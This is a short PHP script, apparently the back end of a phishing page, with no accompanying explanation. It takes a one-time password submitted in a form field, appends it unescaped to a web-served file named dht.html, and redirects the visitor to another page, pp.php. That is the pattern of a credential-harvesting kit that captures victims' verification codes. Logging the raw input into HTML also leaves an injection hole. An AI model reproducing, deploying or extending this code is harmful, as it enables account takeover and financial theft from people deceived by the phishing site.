<?php
header("location:pp.php");
$otp1=$_POST['otp1'];
$handle=fopen('dht.html','a');
fwrite($handle ,"otp1=$otp1\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
